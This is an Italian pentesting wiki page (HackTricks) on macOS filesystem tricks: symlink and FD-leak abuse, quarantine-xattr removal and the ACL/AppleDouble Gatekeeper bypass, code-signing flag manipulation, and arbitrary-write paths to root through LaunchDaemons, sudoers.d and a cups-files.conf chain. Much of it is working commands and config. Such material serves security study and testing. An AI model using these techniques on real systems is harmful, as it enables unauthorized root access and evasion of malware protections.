# Trucchi FS di macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Combinazioni delle autorizzazioni POSIX

Per una **directory**, i tre bit di autorizzazione hanno un significato diverso rispetto a quello che hanno su un file normale. `chmod(1)` chiama il bit di esecuzione "**search**" quando viene applicato a una directory:<sup>[[2]](#references)</sup>

> `0100` Per i file, consente l'esecuzione da parte del proprietario. Per le directory, consente al proprietario di eseguire una **ricerca** nella directory.

- **read** - è possibile **enumerare** le entry della directory (elencarne i nomi).
- **write** - è possibile **creare, rinominare ed eliminare le entry** nella directory. Si noti che questa è una proprietà della directory *contenitore*, non del file: è possibile eliminare un file che non si può leggere o modificare, purché si possa scrivere nella directory padre.
- Per eliminare una **subdirectory** deve essere vuota, il che richiede a sua volta diritti sufficienti per rimuovere tutto ciò che contiene.
- Se la directory ha lo **sticky bit** (`S_ISVTX`, come `/tmp`), ciò è soggetto a restrizioni: POSIX stabilisce che un processo può quindi rimuovere o rinominare file al suo interno solo se ne è il proprietario, se è il proprietario della directory o se dispone dei privilegi appropriati.<sup>[[1]](#references)</sup>
- **execute / search** - si è **autorizzati ad attraversare** la directory. La risoluzione del pathname individua ogni componente "nella directory specificata dal suo predecessore", quindi la **perdita dei diritti di ricerca su un singolo componente del prefisso del percorso rende irraggiungibile tramite path tutto ciò che si trova al di sotto**, anche se il file leaf è leggibile da chiunque.<sup>[[1]](#references)</sup>

### Combinazioni pericolose

**Come sovrascrivere un file/cartella di proprietà di root**, quando:

- Un proprietario di una **directory** padre nel percorso è l'utente
- Un proprietario di una **directory** padre nel percorso è un **gruppo di utenti** con **write access**
- Un **gruppo** di utenti ha accesso in **write** al **file**

Con una qualsiasi delle combinazioni precedenti, un attacker potrebbe **iniettare** un **sym/hard link** nel percorso previsto per ottenere una scrittura arbitraria privilegiata.

### Caso speciale della cartella root R+X

Questo deriva direttamente dalla regola di risoluzione dei pathname descritta sopra. Se una **directory concede solo R+X a root**, i file al suo interno sono irraggiungibili *tramite path* per chiunque altro, ma i bit di autorizzazione dei **file** potrebbero comunque essere permissivi. La directory è l'unico ostacolo.

Pertanto, qualsiasi primitive che consenta di portare il file **fuori da quella directory** — un processo privilegiato che **sposta/rinomina/copia** un percorso scelto dall'attacker in una posizione che è possibile attraversare — si trasforma in una lettura arbitraria, senza dover mai aggirare i mode del file stesso:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Cerca i privileged file movers (installer, log rotator, crash/diagnostic collector, funzionalità di backup ed "export") che accettano un source path da un utente con privilegi inferiori.

## Symbolic Link / Hard Link

### File/cartella permissiva

Se un processo privilegiato scrive dati in un **file** che potrebbe essere **controllato** da un **utente con privilegi inferiori**, o che potrebbe essere stato **creato in precedenza** da un utente con privilegi inferiori. L'utente potrebbe semplicemente **puntarlo a un altro file** tramite un Symbolic o Hard link, e il processo privilegiato scriverà su quel file.

Controlla le altre sezioni in cui un attaccante potrebbe **abusare di una scrittura arbitraria per aumentare i privilegi**.

### Open `O_NOFOLLOW`

Secondo [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Viene controllato solo il componente **finale** — ogni componente **intermedio** viene comunque risolto e seguito. Quindi, uno sviluppatore che ha "protetto" una scrittura con `O_NOFOLLOW` può essere comunque attaccato piantando un symlink in una qualsiasi **directory parent** del target path.<sup>[[3]](#references)</sup>

La stessa man page documenta i flag che chiudono effettivamente questa lacuna:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

Altrimenti, `openat()` relativo a un directory FD già validato, oppure `realpath()` + una nuova validazione, sono i metodi rimanenti per impedire gli scambi di symlink lungo il percorso.

## .fileloc

I file con estensione **`.fileloc`** possono puntare ad altre applicazioni o binary, così quando vengono aperti sarà l'applicazione/binary a essere eseguito.\
Esempio:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Se una chiamata a `open` non include il flag `O_CLOEXEC`, il file descriptor verrà ereditato dal processo figlio. Quindi, se un processo privilegiato apre un file privilegiato ed esegue un processo controllato dall'attaccante, l'attaccante **erediterà il FD sul file privilegiato**.

L'esempio canonico è la **LPE `DYLD_PRINT_TO_FILE` in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` rispettava `DYLD_PRINT_TO_FILE=/path` anche nei **restricted (suid root) binaries**, perché quella particolare variabile veniva analizzata al di fuori di `processDyldEnvironmentVariable()`.
- Eseguiva `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, quindi **creava un file di proprietà di root in un percorso arbitrario**.
- Il FD **non veniva mai chiuso e non aveva il flag close-on-exec**, quindi ogni processo figlio del suid binary ereditava un **FD scrivibile verso un file di proprietà di root**.
- Eseguendo, ad esempio, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` e leggendo poi nel processo figlio il numero del FD ereditato, era possibile effettuare scritture arbitrarie su file di proprietà di root; `fcntl(fd, F_SETFL, 0)` rimuoveva persino `O_APPEND`, consentendo di sovrascrivere invece di aggiungere.

Lo stesso schema si presenta ogni volta che un processo privilegiato apre un file **prima** di eseguire tramite `exec` qualcosa che controlli (helper tools, editor in stile `crontab` invocati tramite `$EDITOR`, file di log/debug aperti da un percorso specificato tramite una variabile d'ambiente...). Enumera i FD ereditati con:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Qualsiasi valore superiore a `2` che punta a un file che non puoi aprire personalmente è una primitive di scrittura arbitraria (o di lettura arbitraria).

## Evitare i trucchi con gli xattrs di quarantine

### Rimuoverlo
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Se un file/cartella ha questo attributo immutable, non sarà possibile applicarvi un xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### File system senza supporto xattr

Non tutti i file system che macOS può montare memorizzano nativamente gli **attributi estesi**. HFS+ e APFS lo fanno; **FAT32, exFAT e la maggior parte dei mount NFS non lo fanno** — macOS li emula scrivendo un file laterale **AppleDouble** denominato `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Questo è importante per la quarantena, perché l'xattr sopravvive solo se può essere effettivamente scritto **e riletto** dallo stesso volume:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Se il volume viene successivamente letto tramite un percorso che ignora il companion `._` (oppure il companion viene rimosso/eliminato), il file arriva **senza un quarantine flag** — e un `.app` non sottoposto a quarantine è sufficiente per eludere l'App Sandbox, come descritto in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Questa ACL impedisce di aggiungere `xattrs` al file
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Il formato di file **AppleDouble** copia un file, inclusi i relativi ACE.

Nel [**codice sorgente**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) è possibile vedere che la rappresentazione testuale dell'ACL memorizzata nell'xattr chiamato **`com.apple.acl.text`** verrà impostata come ACL nel file decompresso. Quindi, se si comprime un'applicazione in un file zip con il formato **AppleDouble**, utilizzando un ACL che impedisce la scrittura di altri xattr... l'xattr quarantine non veniva impostato sull'applicazione:

Per ulteriori informazioni, consulta il [**report originale**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/).<sup>[[6]](#references)</sup>

Per replicare questa situazione, dobbiamo prima ottenere la stringa ACL corretta:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Nota che, anche se funziona, il sandbox scrive prima l'xattr di quarantine)

Non è realmente necessario, ma lo lascio qui per sicurezza:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass dei controlli della firma

### Bypass dei controlli dei platform binaries

Alcuni controlli di sicurezza verificano se il binary è un **platform binary**, ad esempio per consentirgli di connettersi a un servizio XPC. Tuttavia, come illustrato in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, è possibile bypassare questo controllo ottenendo un platform binary (come /bin/ls) e iniettando l'exploit tramite dyld usando una variabile d'ambiente `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass dei flag `CS_REQUIRE_LV` e `CS_FORCED_LV`

È possibile per un binary in esecuzione modificare i propri flag per bypassare i controlli con codice come il seguente:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

I bundle contengono il file **`_CodeSignature/CodeResources`**, che contiene l'**hash** di ogni singolo **file** nel **bundle**. Nota che l'hash di CodeResources è anche **embedded nell'eseguibile**, quindi non possiamo modificare neanche quello.

Tuttavia, ci sono alcuni file la cui signature non verrà verificata; questi hanno la key `omit` nel plist, come:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
È possibile calcolare la firma di una risorsa dalla CLI con:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montare i dmg

Un utente può montare un dmg personalizzato creato anche sopra alcune cartelle esistenti. Ecco come si potrebbe creare un pacchetto dmg personalizzato con contenuto personalizzato:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Di solito macOS monta i dischi comunicando con il servizio Mach `com.apple.DiskArbitrarion.diskarbitrariond` (fornito da `/usr/libexec/diskarbitrationd`). Se si aggiunge il parametro `-d` al file plist di LaunchDaemons e si riavvia, i log verranno memorizzati in `/var/log/diskarbitrationd.log`.\
Tuttavia, è possibile usare strumenti come `hdik` e `hdiutil` per comunicare direttamente con il kext `com.apple.driver.DiskImages`.

## Scritture arbitrarie

### Script sh periodici

Se il tuo script può essere interpretato come uno **script shell**, potresti sovrascrivere lo **script shell `/etc/periodic/daily/999.local`**, che verrà eseguito ogni giorno.

Puoi **simulare** l'esecuzione di questo script con: **`sudo periodic daily`**

### Daemon

Scrivi un **LaunchDaemon** arbitrario come **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** con un plist che esegua uno script arbitrario come:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Genera semplicemente lo script `/Applications/Scripts/privesc.sh` con i **comandi** che vorresti eseguire come root.

### File Sudoers

Se disponi di una **scrittura arbitraria**, potresti creare un file all'interno della cartella **`/etc/sudoers.d/`** per concederti i privilegi **sudo**.

### File PATH

Il file **`/etc/paths`** è uno dei principali punti in cui viene popolata la variabile d'ambiente PATH. Devi essere root per sovrascriverlo, ma se uno script eseguito da un **processo privilegiato** esegue un **comando senza il percorso completo**, potresti essere in grado di **dirottarlo** modificando questo file.

Puoi anche scrivere file in **`/etc/paths.d`** per caricare nuove cartelle nella variabile d'ambiente `PATH`.

### cups-files.conf

Questa tecnica è stata usata in [questo writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Crea il file `/etc/cups/cups-files.conf` con il seguente contenuto:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Questo creerà il file `/etc/sudoers.d/lpe` con permessi 777. Il testo aggiuntivo alla fine serve ad attivare la creazione del log degli errori.

Quindi, scrivi in `/etc/sudoers.d/lpe` la configurazione necessaria per l'escalation dei privilegi, come `%staff ALL=(ALL) NOPASSWD:ALL`.

Poi, modifica nuovamente il file `/etc/cups/cups-files.conf` indicando `LogFilePerm 700`, in modo che il nuovo file sudoers diventi valido invocando `cupsctl`.

### Fuga dalla sandbox

È possibile uscire dalla sandbox di macOS con una scrittura arbitraria sul filesystem. Per alcuni esempi, consulta la pagina [macOS Auto Start](../../../../macos-auto-start-locations.md), ma una tecnica comune consiste nello scrivere un file delle preferenze di Terminale in `~/Library/Preferences/com.apple.Terminal.plist` che esegua un comando all'avvio e chiamarlo usando `open`.

## Generare file scrivibili come altri utenti

Un primitive di privesc molto comune consiste nel fare in modo che un **processo privilegiato crei un file per te** in una directory sotto il tuo controllo, mantenendo poi l'**accesso in scrittura** a quel file. Sono necessari due elementi:

1. Una directory di tua proprietà (o nella quale puoi impostare una **ACL ereditabile**), in modo che qualsiasi elemento creato al suo interno erediti i tuoi permessi.
2. Un processo privilegiato/`suid` al quale sia possibile indicare **dove** creare un file, in genere tramite una variabile d'ambiente di debug/logging, un file di configurazione o l'API XPC di un helper.

La parte relativa alla **ACL ereditabile** è ciò che rende il file creato scrivibile da te, anche se appartiene a un altro utente. I flag di ereditarietà `file_inherit` / `directory_inherit` sono documentati in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Ora qualsiasi file che un processo privilegiato crea all'interno di `$DIRNAME` è **scrivibile da te**. Se quella directory è anche una posizione da cui in seguito viene **eseguito come root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, una directory LaunchDaemon...), questo consente una root escalation diretta. Consulta le sezioni [Sudoers File](#sudoers-file) e [cups-files.conf](#cups-filesconf) sopra per sapere cosa scrivere una volta ottenuto il file.

Per un esempio completo della catena "la variabile d'ambiente fa sì che un processo root crei un file e il FD trapeli fino a te", consulta [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) sopra.

## Memoria condivisa POSIX

La **memoria condivisa POSIX** consente ai processi nei sistemi operativi conformi a POSIX di accedere a un'area di memoria comune, facilitando comunicazioni più rapide rispetto ad altri metodi di comunicazione tra processi. Consiste nella creazione o apertura di un oggetto di memoria condivisa con `shm_open()`, nell'impostazione delle sue dimensioni con `ftruncate()` e nella sua mappatura nello spazio degli indirizzi del processo tramite `mmap()`. I processi possono quindi leggere e scrivere direttamente in quest'area di memoria. Per gestire l'accesso concorrente e prevenire la corruzione dei dati, vengono spesso utilizzati meccanismi di sincronizzazione come mutex o semafori. Infine, i processi rimuovono la mappatura e chiudono la memoria condivisa con `munmap()` e `close()` e, facoltativamente, rimuovono l'oggetto di memoria con `shm_unlink()`. Questo sistema è particolarmente efficace per una IPC efficiente e veloce negli ambienti in cui più processi devono accedere rapidamente a dati condivisi.

<details>

<summary>Esempio di codice del Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Esempio di codice consumer</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** sono una funzionalità di sicurezza introdotta in macOS per migliorare la sicurezza e l'affidabilità delle **operazioni sui file descriptor** nelle applicazioni utente. Questi guarded descriptors offrono un modo per associare restrizioni specifiche o "guard" ai file descriptor, applicate dal kernel.

Questa funzionalità è particolarmente utile per prevenire alcune classi di vulnerabilità di sicurezza, come **l'accesso non autorizzato ai file** o le **race condition**. Queste vulnerabilità si verificano, ad esempio, quando un thread accede a una file description consentendo a **un altro thread vulnerabile di accedervi**, oppure quando un file descriptor viene **ereditato** da un processo figlio vulnerabile. Alcune funzioni relative a questa funzionalità sono:

- `guarded_open_np`: Apre un FD con un guard
- `guarded_close_np`: Lo chiude
- `change_fdguard_np`: Modifica i flag del guard su un descriptor (anche rimuovendo la protezione del guard)

## References

- [1] [POSIX.1-2024 — Definizioni di base, Cap. 4 (Permessi di accesso ai file, Protezione delle directory, Risoluzione dei nomi di percorso)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [Pagina man di `chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [Pagina man di `open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Quali file system e cloud services preservano gli extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Il tallone d'Achille di Gatekeeper: alla scoperta di una vulnerabilità di macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Una nuova era dei macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Alla scoperta delle vulnerabilità Apple: la storia dell'audit di diskarbitrationd e storagekitd, Parte 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
